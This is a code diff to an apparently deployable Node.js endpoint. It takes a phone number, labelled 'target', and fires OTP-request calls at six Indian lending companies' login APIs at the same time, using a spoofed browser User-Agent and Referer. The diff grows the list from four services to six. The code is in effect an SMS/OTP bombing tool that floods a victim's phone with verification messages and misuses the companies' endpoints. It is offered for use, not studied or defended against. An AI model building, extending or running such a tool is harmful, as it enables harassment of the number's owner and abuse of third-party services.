@@ -7,13 +7,12 @@ module.exports = async (req, res) => {
         return res.status(400).json({ error: "Valid 10-digit number required" });
     }
 
-    // Common headers
     const commonHeaders = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Referer': 'https://www.google.com/'
     };
 
-    // Helper to handle different API formats (Form vs JSON)
+    // Helper to handle Form vs JSON
     const safePost = async (url, data, isJson = false) => {
         try {
             const body = isJson ? data : new URLSearchParams(data).toString();
@@ -29,8 +28,8 @@ module.exports = async (req, res) => {
         }
     };
 
-    // Execute all 4 APIs simultaneously
-    const [avanse, bright, stashfin, incred] = await Promise.all([
+    // Execute all 6 APIs simultaneously
+    const [avanse, bright, stashfin, incred, kamakshi, myflot] = await Promise.all([
         // 1. Avanse (Form)
         safePost('https://www.avanse.com/common-loan-apply/otp', {
             'contactNumber': mob,
@@ -53,22 +52,25 @@ module.exports = async (req, res) => {
         // 4. InCred (JSON)
         safePost('https://gateway-api.incred.com/website-bff/public/v1/common/login/otpgenerate', {
             "MOBILE": mob,
-            "UTM_DETAILS": {
-                "partnerId": "9250608873861026P",
-                "utm_source": "google",
-                "utm_medium": "cpc",
-                "utm_campaign": "ww_search_personal_loan_new_flow_brand_keywords_ag1_ad1",
-                "utm_term": "incred",
-                "gad_source": "1"
-            },
+            "UTM_DETAILS": { "utm_source": "google", "utm_medium": "cpc", "utm_term": "incred" },
             "ON_BOARDING_TYPE": "FROM_LOAN_ENQUIRY",
             "STATUS": "Pending"
-        }, true) // 'true' tells the script to send as JSON
+        }, true),
+        // 5. Kamakshi Money (JSON)
+        safePost('https://loan-api.kamakshimoney.com/customers/customer-login-byMobile?utm_source=google_kamakshi_Pmax_Disbursal_web', {
+            "mobile": mob
+        }, true),
+        // 6. MyFlot (Form)
+        safePost('https://prod.myflot.com/api/auth/get_otp', {
+            'phoneNo': mob,
+            'clientId': 'aebccf8a-0f9d-4f6b-bd84-f1ad32e8f234',
+            'utmSource': ''
+        })
     ]);
 
     res.status(200).json({
         success: true,
         target: mob,
-        results: { avanse, bright, stashfin, incred }
+        results: { avanse, bright, stashfin, incred, kamakshi, myflot }
     });
 };
